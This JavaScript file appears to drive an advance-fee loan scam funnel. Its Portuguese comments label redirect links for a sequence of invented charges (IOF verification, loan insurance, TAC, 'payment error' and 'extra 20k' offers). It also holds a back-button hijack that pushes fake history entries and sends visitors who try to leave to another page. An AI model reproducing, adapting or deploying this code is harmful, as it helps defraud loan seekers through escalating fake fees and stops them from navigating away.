const baseLinks = {
  up1: "https://google.com", // IOF
  up2: "https://google.com", // Taxa de verificaÃ§Ã£o de IOF
  up3: "https://google.com", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://google.com", // NFe
  up5: "https://google.comJ", // Ativar conta
  up6: "https://google.com", // Taxa de registro do contrato
  up7: "https://google.com", // ParabÃ©ns, 20k adicional
  up8: "https://google.com", // Erro no pagamento - 14,06
  up9: "https://google.com", // APP - 11,99
  up10: "https://google.com", // Taxa de Abertura TAC - 16,92
  up11: "https://google.com", // Taxa de Consultoria Financeira - 19,53
  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink =
  "https://google.com";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};